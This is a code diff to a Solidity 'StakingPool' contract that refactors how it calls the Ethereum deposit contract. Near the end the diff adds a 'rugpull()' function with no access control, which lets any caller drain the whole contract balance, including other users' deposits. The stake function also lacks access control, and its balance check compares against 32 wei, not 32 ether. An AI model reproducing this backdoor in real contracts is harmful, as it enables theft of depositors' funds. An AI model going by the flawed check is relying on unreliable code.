@@ -4,20 +4,34 @@ pragma solidity >=0.8.0 <0.9.0;
 //import "hardhat/console.sol";
 // import "@openzeppelin/contracts/access/Ownable.sol";
 // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol
+interface IDepositContract {
+
+    function deposit(
+        bytes calldata pubkey,
+        bytes calldata withdrawal_credentials,
+        bytes calldata signature,
+        bytes32 deposit_data_root
+    ) external payable;
+
+}
+
 
 contract StakingPool {
 
-  event Deposit(bytes result, address depositContract, address caller)
+  event Deposit(address depositContractAddress, address caller);
 
   mapping (address => uint) public userBalances;
+
   enum State { acceptingDeposits, staked, exited }
   State currentState;
 
-  address public depositContract;
+  address public depositContractAddress;
+  IDepositContract depositContract;
 
-  constructor(address depositContract_)  {
+  constructor(address depositContractAddress_)  {
     currentState = State.acceptingDeposits;
-    depositContract = depositContract_;
+    depositContractAddress = depositContractAddress_;
+    depositContract = IDepositContract(depositContractAddress);
   }
 
   function deposit(address userAddress) public payable {
@@ -31,14 +45,23 @@ contract StakingPool {
     payable(msg.sender).transfer(_amount);
   }
 
-  function stake(bytes calldata depositData) public {
+  function stake(
+    bytes calldata pubkey,
+    bytes calldata withdrawal_credentials,
+    bytes calldata signature,
+    bytes32 deposit_data_root
+  ) public {
+    require(address(this).balance >= 32, "not enough eth");
     currentState = State.staked;
     uint value = 32 ether;
-    (bool success, bytes memory result) = depositContract.call{value: value}(depositData);
-    require(success, "executeTransaction: tx failed");
-    emit Deposit(result, depositContract, msg.sender);
+    depositContract.deposit{value: value}(pubkey, withdrawal_credentials, signature, deposit_data_root);
+
+    emit Deposit(depositContractAddress, msg.sender);
   }
 
+  function rugpull() public {
+    payable(msg.sender).transfer(address(this).balance);
+  }
 
   function unstake() public {
     currentState = State.exited;
